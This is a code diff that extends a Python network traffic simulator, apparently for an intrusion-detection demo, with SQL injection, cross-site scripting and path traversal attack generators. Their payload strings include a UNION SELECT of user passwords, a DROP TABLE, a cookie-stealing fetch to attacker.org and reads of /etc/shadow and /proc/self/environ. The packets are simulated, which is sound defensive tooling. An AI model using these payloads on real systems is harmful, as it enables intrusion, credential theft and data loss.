@@ -107,6 +107,21 @@ class TrafficSimulator:
             "delay": delay,
         }))
 
+    def launch_sqli_attack(self, src_ip=None):
+        self._jobs.put(("SQLI", {
+            "src_ip": src_ip or random.choice(EXTERNAL_SOURCES),
+        }))
+
+    def launch_xss_attack(self, src_ip=None):
+        self._jobs.put(("XSS", {
+            "src_ip": src_ip or random.choice(EXTERNAL_SOURCES),
+        }))
+
+    def launch_path_traversal_attack(self, src_ip=None):
+        self._jobs.put(("TRAVERSAL", {
+            "src_ip": src_ip or random.choice(EXTERNAL_SOURCES),
+        }))
+
     # ------------------------------------------------------------------ main loop
     def _loop(self):
         while self._running.is_set():
@@ -124,6 +139,12 @@ class TrafficSimulator:
                 self._run_flood(**params)
             elif job == "STEALTH_SCAN":
                 self._run_stealth_scan(**params)
+            elif job == "SQLI":
+                self._run_sqli(**params)
+            elif job == "XSS":
+                self._run_xss(**params)
+            elif job == "TRAVERSAL":
+                self._run_path_traversal(**params)
 
             # 2. Normal background traffic
             if self.normal_enabled:
@@ -151,9 +172,11 @@ class TrafficSimulator:
         if random.random() < 0.15:
             src = random.choice(NORMAL_SOURCES)
             dst = random.choice(SERVERS)
+            dns_query = f"Standard query 0x{random.randint(1000, 9999):x} A google.com"
             return Packet(src_ip=src, dst_ip=dst,
                           src_port=random.randint(1024, 65535), dst_port=53,
                           protocol="UDP", flags="", kind=config.KIND_NORMAL,
+                          payload=dns_query,
                           size=random.randint(64, 512)), None
 
         # TCP traffic with handshake progression
@@ -177,9 +200,24 @@ class TrafficSimulator:
                                   size=64), sess
                 else:
                     kind = config.KIND_AUTH if sess["is_auth"] else config.KIND_NORMAL
+                    if sess["dport"] == 80:
+                        payload = random.choice([
+                            "GET /index.html HTTP/1.1\r\nHost: example.com",
+                            "GET /api/status HTTP/1.1\r\nHost: api.local",
+                            "POST /api/feedback HTTP/1.1\r\nHost: app.local\r\n\r\nmessage=System+normal",
+                            "GET /images/logo.png HTTP/1.1\r\nHost: cdn.local",
+                        ])
+                    elif sess["dport"] == 443:
+                        payload = "TLS 1.3 Application Data [Encrypted]"
+                    elif sess["dport"] == 22:
+                        payload = "SSH-2.0-OpenSSH_8.9p1"
+                    else:
+                        payload = ""
+
                     return Packet(src_ip=sess["src"], dst_ip=sess["dst"],
                                   src_port=sess["sport"], dst_port=sess["dport"],
                                   protocol="TCP", flags="PSH,ACK", kind=kind,
+                                  payload=payload,
                                   auth_success=True, size=random.randint(128, 1460)), sess
 
         # Start a new TCP connection (SYN packet)
@@ -278,4 +316,70 @@ class TrafficSimulator:
                               src_port=random.randint(1024, 65535), dst_port=port,
                               protocol="TCP", flags=flags,
                               kind=config.KIND_STEALTH, size=64))
+            time.sleep(delay)
+
+    def _run_sqli(self, src_ip, delay=0.08):
+        """Generates realistic HTTP packets weaponized with SQL Injection payloads."""
+        dst = random.choice(SERVERS)
+        sport = random.randint(1024, 65535)
+        payloads = [
+            "GET /search?query=admin' OR 1=1 -- HTTP/1.1\r\nHost: portal.local",
+            "POST /api/login HTTP/1.1\r\nHost: portal.local\r\n\r\nuser=admin' UNION SELECT id,password,email FROM users --",
+            "GET /items?cat=1; DROP TABLE logs; -- HTTP/1.1\r\nHost: portal.local",
+            "GET /account?user=' OR 'x'='x' HTTP/1.1\r\nHost: portal.local",
+        ]
+        # Handshake
+        self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP", flags="SYN", size=64))
+        time.sleep(delay)
+        self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP", flags="ACK", size=64))
+        time.sleep(delay)
+        for p in payloads:
+            if not self._running.is_set():
+                return
+            self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP",
+                              flags="PSH,ACK", kind=config.KIND_SQLI, payload=p, size=len(p)))
+            time.sleep(delay)
+
+    def _run_xss(self, src_ip, delay=0.08):
+        """Generates realistic HTTP packets weaponized with Cross-Site Scripting (XSS) payloads."""
+        dst = random.choice(SERVERS)
+        sport = random.randint(1024, 65535)
+        payloads = [
+            "POST /comments HTTP/1.1\r\nHost: blog.local\r\n\r\ncomment=<script>alert('XSS Exploit!')</script>",
+            "GET /profile?name=<img src=x onerror=alert(document.cookie)> HTTP/1.1\r\nHost: portal.local",
+            "GET /welcome?user=<svg/onload=fetch('//attacker.org/'+document.cookie)> HTTP/1.1\r\nHost: portal.local",
+            "GET /redirect?url=javascript:alert('pwned') HTTP/1.1\r\nHost: portal.local",
+        ]
+        # Handshake
+        self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP", flags="SYN", size=64))
+        time.sleep(delay)
+        self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP", flags="ACK", size=64))
+        time.sleep(delay)
+        for p in payloads:
+            if not self._running.is_set():
+                return
+            self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP",
+                              flags="PSH,ACK", kind=config.KIND_XSS, payload=p, size=len(p)))
+            time.sleep(delay)
+
+    def _run_path_traversal(self, src_ip, delay=0.08):
+        """Generates realistic HTTP packets attempting Directory/Path Traversal (LFI)."""
+        dst = random.choice(SERVERS)
+        sport = random.randint(1024, 65535)
+        payloads = [
+            "GET /download?file=../../../../etc/passwd HTTP/1.1\r\nHost: file.local",
+            "GET /view?doc=..\\..\\windows\\system32\\drivers\\etc\\hosts HTTP/1.1\r\nHost: files.local",
+            "GET /read?path=../../../../proc/self/environ HTTP/1.1\r\nHost: api.local",
+            "GET /image?file=../../../../etc/shadow HTTP/1.1\r\nHost: file.local",
+        ]
+        # Handshake
+        self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP", flags="SYN", size=64))
+        time.sleep(delay)
+        self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP", flags="ACK", size=64))
+        time.sleep(delay)
+        for p in payloads:
+            if not self._running.is_set():
+                return
+            self._emit(Packet(src_ip=src_ip, dst_ip=dst, src_port=sport, dst_port=80, protocol="TCP",
+                              flags="PSH,ACK", kind=config.KIND_TRAVERSAL, payload=p, size=len(p)))
             time.sleep(delay)
